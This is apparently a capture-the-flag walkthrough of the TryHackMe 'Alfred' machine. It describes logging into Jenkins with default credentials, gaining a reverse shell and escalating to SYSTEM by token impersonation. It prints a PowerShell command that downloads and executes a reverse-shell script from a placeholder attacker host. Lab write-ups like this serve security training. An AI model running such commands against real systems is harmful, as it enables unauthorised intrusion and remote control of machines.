To access the machine, click on the link given below:
- https://tryhackme.com/room/alfred

# SCANNING

I performed an **nmap** aggressive scan on the target to identify the open ports and the services running on them.

![](IMAGES/1.png)

# FOOTHOLD

The target had  http service running on port 80 and 8080, so I accessed them through my browser.

![](IMAGES/2.png)

I found a **jenkins** login page on port 8080.

![](IMAGES/3.png)

I also viewed the *robots.txt* file that was identified by the **nmap** scan.

![](IMAGES/4.png)

I googled default credentials for **Jenkins** and found the default username.

![](IMAGES/5.png)

I tried few combinations and logged in using the credentials:
- username: `admin`
- password: `admin`

![](IMAGES/6.png)

With access to jenkins, I could execute code to get a reverse shell. I downloaded the `Invoke-PowerShellTcp.ps1` script from **nishang**.
- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

I then started an http server to host the powershell script.

![](IMAGES/7.png)

On **Jenkins**, I created a new project, new build, then added a command to download the reverse shell script and send a shell to my system.

![](IMAGES/8.png)

I used the following command:

```
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port ATTACKER_PORT)
```

![](IMAGES/9.png)

Finally, I started a **netcat** listener and built the project.

![](IMAGES/10.png)

![](IMAGES/11.png)

I got a reverse shell from the target and captured the user flag from *`C:\Users\bruce\Desktop`*.

![](IMAGES/12.png)

![](IMAGES/13.png)

# PRIVILEGE ESCALATION

I viewed my privileges and found that I had the **`SeImpersonatePrivilege`** enabled.

![](IMAGES/14.png)

For better functionality and usability, I created an **msfvenom** payload to get a **meterpreter** shell.

![](IMAGES/15.png)

![](IMAGES/16.png)

![](IMAGES/17.png)

![](IMAGES/18.png)

After getting **meterpreter** shell, I loaded the **incognito** module for token impersonation.

![](IMAGES/19.png)

I then listen available tokens and Found `NT AUTHORITY\SYSTEM`. I then impersonated the account and got SYSTEM access.

![](IMAGES/20.png)

I had a 32 bit session so I upgraded it to 64 bit by migrating to a 64 bit process. Finally, I captured the root flag from `C:\Windows\System32\config\root.txt`

![](IMAGES/21.png)

---
